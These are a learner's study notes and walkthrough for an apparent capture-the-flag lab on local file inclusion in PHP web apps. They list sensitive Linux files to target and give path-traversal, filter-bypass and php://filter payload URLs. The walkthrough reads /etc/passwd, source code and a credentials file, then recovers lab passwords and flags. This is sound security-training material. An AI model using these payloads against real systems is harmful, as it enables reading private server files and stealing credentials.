# Patch Management is Hard

## General Notes from Video
- The tty section in the ping output means "time to live", and represents the number of hops it is allowed to have before expiring. The tty varies between different OS, so it's a useful identifier of what OS you're dealing with

## Local File Inclusion Vulnerability
- Local file inclusion (LFI) vulerability is a web application vulnerability that allows the attacker to include and read local files on the server, which can contain keys, passwords, and other private data
- Occurs dure to a developer's lack of security awareness
    - Ex. If a developer includes files without proper input validation and doesn't filter/sanitize user input
- Found in various we applications
    - Ex. In php, these functions can cause the vulnerability
        - include
        - require
        - include_once
        - require_once
## Risk of LFI
- If a LFI is found, it's possible to read sensititive data and write to files
- One of the most significant risks is leaking sensitive data
- In some cases LFI can be chained to perform RCE on the server
## Identifying and Testing for LFI
- Attackers are interesed in HTTP parameters to manupulate input and inject attack payloads to see how the web application behaves
- Entry points - where to start looking for vulerabilities
    - It's important to use the web app and see how it works to find an entry point
    - Other entry points can be User-Agent, Cookies, session, and other HTTP headers
- HTTP query parameters are query strings attached to the URL that could be used to retrieve data or perform actions based on user input
- This code uses a GET request with the URL parameter 'file' to include a file on the page. This request can be mnade using `http://example.thm.labs/index.php?file=welcome.txt`, and is vulerable to LFI because it allows any user to access files in the directory
><?PHP 
>	include($_GET["file"]);
>?>
- Some Linux system files that contain sensitive information that we can test for:
>/etc/issue
>/etc/passwd
>/etc/shadow
>/etc/group
>/etc/hosts
>/etc/motd
>/etc/mysql/my.cnf
>/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
>/proc/self/environ
>/proc/version
>/proc/cmdline
- A few techniques to use when testing:
    - A direct file inclusion, which starts with /etc/passwd
    - using `..` to get out the current directory, the number of `..` is varies depending on the web app directory. 
    - Bypassing filters using `....//`.
    - URL encoding techniques (such as double encoding)
- Ex.
<div>
   http://example.thm.labs/page.php?file=/etc/passwd
   http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
   http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
   http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
   http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
<div>
- When we navigate to the web page for this exercise, we see that the landing page url is `https://machine_ip/index.php?err=error.txt`. This shows us that php is using the parameter `err` to display `error.txt`. Assuming the err parameter uses the include function, we do `https://machine_ip/index.php?err=../../../etc/passwd` and get the passwd file's contents printed on the page
>root:x:0:0:root:/root:/bin/bash
>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
>bin:x:2:2:bin:/bin:/bin/sh
>sys:x:3:3:sys:/dev:/bin/sh
>sync:x:4:65534:sync:/bin:/bin/sync
>games:x:5:60:games:/usr/games:/bin/sh
>man:x:6:12:man:/var/cache/man:/bin/sh
>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
>mail:x:8:8:mail:/var/mail:/bin/sh
>news:x:9:9:news:/var/spool/news:/bin/sh
>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
>proxy:x:13:13:proxy:/bin:/bin/sh
>www-data:x:33:33:www-data:/var/www:/bin/sh
>backup:x:34:34:backup:/var/backups:/bin/sh
>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
>mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
## Exploiting LFI
- Depends on the web application server configuration
- If we're dealing with a PHP we app, we can use a [PHP supported Wrapper](https://www.php.net/manual/en/wrappers.php.php)
- PHP provides various methods of transmission of data to allow PHP to read from, which can enable reading data via various data type channels
## PHP Filter
- The PHP filter wrapper is used in LFI to read the actual PHP content
- Typically, it's not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code, however we can use the PHP filter to display the content of PHP files inother encoding formats such as base64 or ROT13
## Exercise
- I used OSWAP ZAP for this, like it's used in the video
1. err
2. Use `https://machine_ip/index.php?err=../../../etc/flag` THM{d29e08941cf7fe41df55f1a7da6c4c06}
3. Use the [PHP filter wrapper](https://www.php.net/manual/en/wrappers.php.php) like so `http://machine_ip?err=php://filter/convert.base64-encode/resource=index.php` to get the base64. Then decode it with cyberchef to find THM{791d43d46018a0d89361dbf60d5d9eb8}
4. From the previous decoded code we see `include("./includes/creds.php");`. If we try the same PHP filter wrapper to view creds.php `http://machine_ip?err=php://filter/convert.base64-encode/resource=./includes/creds.php` and decode the base64, we get `<?php $USER = "McSkidy"; $PASS = "A0C315Aw3s0m";?`
5. Now go back to the website and log in with the credentials. Go to Password Recovery and we see
>Server Name: web.thm.aoc - Password: pass123
>Server Name: ftp.thm.aoc - Password: 123321
>Server Name: flag.thm.aoc - Password: THM{552f313b52e3c3dbf5257d8c6db7f6f1}
